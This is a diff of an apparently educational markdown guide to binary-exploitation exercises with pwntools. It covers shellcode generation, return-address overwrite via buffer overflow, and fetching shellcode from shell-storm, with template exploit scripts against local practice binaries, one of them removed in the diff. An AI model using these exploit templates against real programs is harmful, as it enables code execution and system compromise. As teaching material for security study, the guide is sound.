@@ -252,6 +252,13 @@ p.interactive()
 ```
  > ***PLEASE NOTE:***  This is very common when the exercise involves the opening of a shell *(then you can use as a normal shell)*. So in this case remember to use this interactive mode rather than doing a recvall() which will not do anything good (the python script will continue to run and never stop).
 
+To create a shell using pwntools we can simply do:
+```python
+shellcode = asm(shellcraft.sh())
+```
+Then if we are able to inject this code to the program and execute it (see [Redirect execution](#Redirect-execution)) we can interact with this shell using the command seen before.
+> ***PLEASE NOTE:*** In order for the shellcode to be correct, you need to set context.binary (see [ELF session](#ELF))
+
 ### ELF
 ELF is a class of pwntools that it's very useful because it allows use to retrieve some information from the ELF file (i.e. the executable in Linux) without having to use debuggers, disassembler etc...
 Whatever you need to do with this class, firstly we need to create an elf object (which basiacally represent the program):
@@ -266,45 +273,56 @@ Some usefull stuff we can do is:
 
 
 
+## Consequences: some types of attacks
+### Redirect execution
+When a function calls another function, it:
+- pushes a return pointer (EIP) to the stack so the called function knows where to return
+- when the called function finishes execution, it pops it off the stack again
+Because this value is saved on the stack, just like our local variables, if we write more characters than the program expects, we can overwrite the value and redirect code execution to wherever we wish.
+
+To redirect the execution (i.e. changing where we return):
+- first we need to find the padding until we begin to overwrite the return pointer (EIP)  -> use [cyclic patterns](#Cyclic-patterns)
+- then we need to find what value we want to overwrite EIP to (i.e. the address of the function we want to execute) -> use [ELF .symbols function](#ELF) or use [afl command in Radare2](#Radare2-basics)
+ 
+Basically the code in python will loke like this:
+```python
+from pwn import *            # import pwntools
+
+p = process('./name_of_the_process')        # to interact with the process
+
+payload = b'A' * n       # n is the number of bytes for the padding
+payload += p32(address_to_go)   # pack the address of the function to execute
+
+p.sendline(payload)
+# if the function to execute is the opening of a shell then you need to add also:
+# p.interactive()
+```
+ 
+> ***PLEASE NOTE:*** In real exploits, it's not particularly likely that you will have a suitable function lying around, so the shellcode is a way to run your own instructions, giving you the ability to run arbitrary commands on the system. So instead of jumping to a funtion we can for example jump to the address of the start of the buffer, so if we input some code in the buffer it will be executed. Here we can put some code that opens a shell (see [how to find a shellcode](#Some-things-to-remember)).
 
 
-> ***FOCUS: REDIRECT EXECUTION*** 
-> 
-> When a function calls another function, it:
-> - pushes a return pointer (EIP) to the stack so the called function knows where to return
-> - when the called function finishes execution, it pops it off the stack again
-> 
-> Because this value is saved on the stack, just like our local variables, if we write more characters than the program expects, we can overwrite the value and redirect code > > execution to wherever we wish.
-> To redirect the execution (i.e. changing where we return):
-> - first we need to find the padding until we begin to overwrite the return pointer (EIP)  -> use [cyclic patterns](Cyclic-patterns)
-> - then we need to find what value we want to overwrite EIP to (i.e. the address of the function we want to execute) -> use [ELF .symbols function](#ELF) or use [afl command in Radare2](#Radare2-basics)
-> 
-> Basically the code in python will loke like this:
-> ```python
-> from pwn import *            # import pwntools
-> p = process('./name_of_the_process')        # to interact with the process
-> payload = b'A' * n       # n is the number of bytes for the padding
-> payload += p32(address_to_go)   # pack the address of the function to execute
-> p.sendline(payload)
-> # if the function to execute is the opening of a shell then you need to add also:
-> # p.interactive()
-> ```
+### Some things to remember
+- ***HOW TO FIND A SHELLCODE***
+ 
+    - If you'd like to do a shellcode attack you need to input in the buffer some code that opens a shell *(i.e. usually the vulnerability is a gets(buffer) where you can overflow the buffer and put as return address the start of the buffer where you have the code of the shell, see [how to redirect execution](#Redirect-execution)).* This shellcode can be find at https://shell-storm.org/shellcode/index.html where there are different shellcodes based on architecture and features. You can search manually or do a simple python program to search it for you. The code of this program can be e.g.:
+        ```python
+        import requests
+
+        keyword1 = "bash"       #we want a bash shell
+        keyword2 = "execve"     #we want a shell that is able to execute a program referred to by pathname
+        shellcodes = "http://shell-storm.org/api/?s=" + keyword1 + "*" + keyword2           #filter the shellcodes based on the keywords
+
+        response = requests.get(shellcodes)
+        possible_shellcodes = response.content      #get the possible shellcodes (filtered before)
+        print(possible_shellcodes)      #prints the name and the link where to find the suitable shellcodes
+        ```
+        Then you can search for the most suitable between the choices in the print (please make sure to look at the correct architecture and at the bytes needed for the shellcode).
+    
+    - Alternatively, you can create a shell using [pwntools shellcraft command](#Interactive-sessions)
 
 
 
-> ***FOCUS: HOW TO FIND A SHELLCODE*** If you'd like to do a shellcode attack you need to input in the buffer some code that opens a shell *(i.e. usually the vulnerability is a gets(buffer) where you can overflow the buffer and put as return address the start of the buffer where you have the code of the shell).* This shellcode can be find at https://shell-storm.org/shellcode/index.html where there are different shellcodes based on architecture and features. You can search manually or do a simple python program to search it for you. The code of this program can be e.g.:
-> ```python
-> import requests
-> 
-> keyword1 = "bash"       #we want a bash shell
-> keyword2 = "execve"     #we want a shell that is able to execute a program referred to by pathname
-> shellcodes = "http://shell-storm.org/api/?s=" + keyword1 + "*" + keyword2           #filter the shellcodes based on the keywords
->
-> response = requests.get(shellcodes)
-> possible_shellcodes = response.content      #get the possible shellcodes (filtered before)
-> print(possible_shellcodes)      #prints the name and the link where to find the suitable shellcodes
-> ```
-> Then you can search for the most suitable between the choices in the print (please make sure to look at the correct architecture and at the bytes needed for the shellcode).
+
 
 
 
@@ -431,23 +449,6 @@ then we pack it as io.pack(...) io.pacK(...) and then enjoy the shell
 
 
 ```
-from pwn import *
-
-context.binary = ELF('./vuln')
-
-p = process()
-
-payload = asm(shellcraft.sh())          # The shellcode
-payload = payload.ljust(312, b'A')      # Padding
-payload += p32(0xffffcfb4)              # Address of the Shellcode
-
-p.sendline(payload)
-
-p.interactive()
-```
-
-
-```
 ROP?? Vedi segnalibro + roba stack a parte 
 (secondo me metterei anche la robe della shell qui tipo)
 
@@ -457,7 +458,6 @@ La funzione gets() acquisisce una stringa da tastiera, fino alla fine, compresi 
 
  
  +PWNTOOLS DI TRINCAW
- asm(shellcraft.sh())                                          /crea una shell 
  offset = cyclic_find("kaaa")                                  /ritorna la distanza della stringa kaaa sul cyclic
  c.binary.got["exit"]                                          /ottiene l'indirizzo della funzione exit in got
  c.binary.functions["win"].address                             /ottiene l'indirizzo di un metodo all'interno del
